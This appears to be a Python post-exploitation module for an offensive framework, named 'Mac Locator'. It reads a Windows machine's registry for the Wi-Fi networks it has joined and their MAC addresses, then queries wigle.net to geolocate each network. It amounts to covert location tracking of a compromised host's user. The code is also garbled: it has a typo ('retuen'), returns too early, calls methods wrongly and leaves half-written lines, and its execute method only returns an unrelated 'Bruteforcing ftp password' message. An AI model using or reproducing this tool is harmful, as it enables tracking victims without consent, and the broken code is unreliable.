MODULE_TYPE = "postexploit"
import os
import optparse
import mechanize
import urllib,time
import re
try:
    import urlparse
    from _winreg import *
except:
    pass
    
import pyfiglet
from collections import OrderedDict
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Mac Locator',
            'Rank':'Good',
            'Platform':'Windows/win32',
            'architectures':'x86/64 bit processors',
            'Description': ':Locates Mac addresses',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('UNAME', ('', True, 'wigle username')),
                ('PASS', ('',True,'wigle password'))
                ])
                }
    def help(self):
    	print("Usage: set UNMAME <wigle username> | set PASS <wigle password> then run")
    	
    def val2addr(self,val):
    	addr = ''
    	for ch in val:
    		addr += '%02x '% ord(ch)
    		addr = addr.strip(' ').replace(' ', ':')[0:17]
    		return addr
    def wiglePrint(self,username, password, netid):
    	browser = mechanize.Browser()
    	browser.open('http://wigle.net')
    	reqData = urllib.urlencode({'credential_0':username,'credential_1':password})
    	browser.open('https://wigle.net//gps/gps/main/login', reqData)
    	params = {}
    	params['netid'] = netid
    	reqParams = urllib.urlencode(params)
    	respURL = 'http://wigle.net/gps/gps/main/confirmquery/'
    	resp = browser.open(respURL, reqParams).read()
    	mapLat = 'N/A'
    	mapLon = 'N/A'
    	rLat = re.findall(r'maplat=.*\&', resp)
    	if rLat:
    		mapLat = rLat[0].split('&')[0].split('=')[1]
    		rLon = re.findall(r'maplon=.*\&', resp)
    	if rLon:
    		mapLon = rLon[0].split
    		print ('[-] Lat: ' + mapLat + ', Lon: ' + mapLon)
    def printNets(self,username, password):
    	net="/SOFTWARE/Microsoft/Windows//NT/CurrentVersion/NetworkList/Signatures/Unmanaged"
    	key = OpenKey(HKEY_LOCAL_MACHINE, net)
    	print ('\n[*] Networks You have Joined.')
    	for i in range(100):
    		try:
    			guid = EnumKey(key, i)
    			netKey = OpenKey(key, str(guid))
    			(n, addr, t) = EnumValue(netKey, 5)
    			(n, name, t) = EnumValue(netKey, 4)
    			macAddr = val2addr(addr)
    			netName = str(name)
    			print ('[+] ' + netName + ' ' + macAddr)
    			self.wiglePrint(username, password, macAddr)
    			try:
    				self.CloseKey(netKey)
    			except:
    				pass
    		except:
    			retuen
   
    def execute(self):
        username = self.info['Options']['UNAME'][0]
        password = self.info['Options']['PASS'][0]
        
        return "[+] Bruteforcing ftp password ..."